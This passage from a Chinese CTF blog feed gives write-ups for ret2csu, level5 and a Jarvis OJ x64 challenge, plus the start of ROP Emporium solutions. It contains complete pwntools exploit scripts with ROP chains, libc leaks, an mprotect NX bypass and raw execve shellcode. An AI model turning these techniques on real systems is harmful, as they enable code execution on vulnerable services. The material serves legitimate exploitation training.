    <content type="html"><![CDATA[<h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p><p>这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。<br>Emmm真是一个异常简洁的main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png" alt></p><p>我们发现它有个pwnme函数哦，那就点进去看一下</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png" alt></p><p>它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png" alt></p><a id="more"></a><p>然后我们会看到还有一个ret2win函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%874.png" alt></p><p>看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%875.png" alt></p><p>我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。<br>ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%876.png" alt></p><p>由函数体关系得知<br>rbx=0<br>rbp=1（rbp=rbx+1）<br>r12：存调用函数的地址<br>r13：函数的第一个参数<br>r14：函数的第二个参数<br>r15：函数的第三个参数（a3/rdx）</p><p>然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址，</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%877.png" alt></p><p>就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。</p><p>rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。<br>理清得差不多了，就开始写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bss = 0x0601060</span></span><br><span class="line">start = 0x0400880<span class="comment">#mov rdx, r15;mov  rsi, r14;mov  edi, r13d;call  qword ptr [r12+rbx*8]</span></span><br><span class="line">end = 0x0400896<span class="comment">#add  rsp, 8;pop  rbx;pop  rbp;pop  r12/r13/r14/r15</span></span><br><span class="line">init = 0x0600E10</span><br><span class="line">win = 0x04007B1</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(1)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(init)<span class="comment">#r12</span></span><br><span class="line">payload += p64(0)<span class="comment">#r13</span></span><br><span class="line">payload += p64(0)<span class="comment">#r14</span></span><br><span class="line">payload += p64(0xdeadcafebabebeef)<span class="comment">#r15(rdx)</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload += <span class="string">"a"</span>*56</span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行之后就拿到flag了</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%878.png" alt></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>Ida里打开main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%879.png" alt><br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8710.png" alt></p><p>发现这个程序调用了write和read两个函数。<br>没有system没有“/bin/sh”<br>看到了熟悉的gadget</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8711.png" alt></p><p>再看看在write和read里面，参数分别是存入哪些寄存器</p><p>Write<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8712.png" alt></p><p>Read<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8713.png" alt></p><p>易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）<br>在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d</p><p>我们要做的是<br>（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址<br>（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8<br>（3）、调用system函数达成getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level5"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#bss_base = elf.bss()</span></span><br><span class="line">bss_addr = 0x0601040</span><br><span class="line"></span><br><span class="line">start_addr = 0x0400600  <span class="comment">#add rsp, 8 pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">end_addr = 0x040061A  <span class="comment">#mov rdx,13 rsi,r14 eid,r15 call</span></span><br><span class="line">_start = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15,_start):</span><br><span class="line">payload = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(start_addr)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(_start)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,write_got,8,write_got,1,_start)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(8))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">offest = write_addr-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc.dump(<span class="string">'system'</span>)+offest</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,read_got,16,bss_addr,0,_start)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,bss_addr,0,0,bss_addr+8,_start)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8714.png" alt></p><h2 id="OJ-level5"><a href="#OJ-level5" class="headerlink" title="OJ level5"></a>OJ level5</h2><p>题目说假设system和execve被禁用，用mmap和mprotect实现getshell。<br>所以我们需要自己将shellcode写进bss段里。</p><p>科普一下mmap和mprotect</p><p>我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)</span><br><span class="line"></span><br><span class="line">返回值：成功返回被映射的内存地址，失败返回MAP_FIALED</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。<br>参数 len<br>指定被映射的内存区域的长度。<br>参数 port<br>这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。<br>参数 flag<br>这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。</p><p>mprotect 函数可以更改一个已经存在的映射区的访问权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">int mprotect(void* addr, size_t len, int port)</span><br><span class="line"></span><br><span class="line">返回值：成功返回0，失败返回-1</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个参数是mmap返回的数值，此时它就是mprotect作用的范围。<br>参数 len<br>指定映射区的长度，它需要与mmap中指定相同。<br>参数 port<br>在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。</p><p>好，我们来看题</p><p>开了NX<br>既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8715.png" alt></p><p>readelf -S先找到bss的地址</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8716.png" alt></p><p>vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行</p><p>思路：<br>（1）先通过write函数leak出write（也可以是其他）的真实地址<br>（2）找到mprotect的真实地址<br>（3）将shellcode写入bss段<br>（4）调用mprotect将bss段权限更改<br>（5）调用bss，getshell</p><p>第一段的代码：（leak write_addr，found mprotect_addr）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8717.png" alt></p><p>第二段（shellcode写入bss）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8718.png" alt></p><p>第三段（找两个空的got地址，将mprotect和bss写入方便调用）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8719.png" alt></p><p>最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8720.png" alt></p><h1 id="两种方法的exp"><a href="#两种方法的exp" class="headerlink" title="两种方法的exp"></a>两种方法的exp</h1><p>第一种（写个函数，直接调用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh=remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf =ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">vul = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"><span class="comment">#read_plt = elf.symbols['read']</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_libc = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#write_plt = elf.plt['write']</span></span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop5_addr = 0x04006A6</span><br><span class="line">mov_call = 0x0400690    </span><br><span class="line"></span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line"></span><br><span class="line">def csu(r12,r13,r14,r15,data=False):</span><br><span class="line">data_num=<span class="string">''</span></span><br><span class="line">payload = <span class="string">"a"</span>*0x88</span><br><span class="line">payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(mov_call)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(vul)</span><br><span class="line">sh.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="keyword">if</span> data==True:</span><br><span class="line">data_num = u64(sh.recv(8))</span><br><span class="line"><span class="built_in">return</span> data_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = csu(write_got,8,read_got,1,True)</span><br><span class="line">mprotect_addr = read_addr - read_libc + mprotect_libc</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mprotect_addr:"</span> + hex(mprotect_addr)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">csu(read_got,len(shellcode),bss,0)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line">csu(read_got,8,mprotect_got,0)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line">csu(mprotect_got,7,0x1000,0x600000)</span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">csu(read_got,8,bss_got,0)</span><br><span class="line">sh.send(p64(bss))</span><br><span class="line">csu(bss_got,0,0,0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>第二种（用pop rdi，rsi，rdx来存参）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh =remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_plt = 0x04004B0</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vul = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">pop5_addr = 0x00000000004006A6</span><br><span class="line">mov_call = 0x0000000000400690     <span class="comment">#distence 0x1a</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">data = sh.recv(8)</span><br><span class="line">write_addr = u64(data)</span><br><span class="line"></span><br><span class="line">libc_dis = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_addr = libc_dis + libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">bss_got = 0x0000000000600A48</span><br><span class="line">payload4 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(bss_base)) </span><br><span class="line"></span><br><span class="line">mprotect_got = 0x0000000000600A50</span><br><span class="line">payload3 = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">'a'</span>*0x80+p64(0)</span><br><span class="line">payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)</span><br><span class="line">payload5 +=p64(mov_call) </span><br><span class="line">payload5 += <span class="string">'a'</span>*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)</span><br><span class="line">payload5 += p64(mov_call)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload5)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"><a href="#权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限" class="headerlink" title="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"></a>权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限</h1><p>找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;libc-csu&quot;&gt;&lt;a href=&quot;#libc-csu&quot; class=&quot;headerlink&quot; title=&quot;_libc_csu&quot;&gt;&lt;/a&gt;&lt;em&gt;_libc_csu&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;1、Ret2csu&lt;/p&gt;
&lt;p&gt;这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。&lt;br&gt;Emmm真是一个异常简洁的main函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;我们发现它有个pwnme函数哦，那就点进去看一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>ROP Emporium</title>
    <link href="https://c0yo7e.github.io/2019/07/08/ROP%20Emporium/"/>
    <id>https://c0yo7e.github.io/2019/07/08/ROP Emporium/</id>
    <published>2019-07-08T04:12:19.000Z</published>
    <updated>2020-08-02T05:13:13.784Z</updated>
    
    <content type="html"><![CDATA[<p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-split"><a href="#2-split" class="headerlink" title="2-split"></a>2-split</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">cat_flag = 0x0601060</span><br><span class="line">bss = 0x0601080</span><br><span class="line">pop_rdi = 0x0400883</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-callme"><a href="#3-callme" class="headerlink" 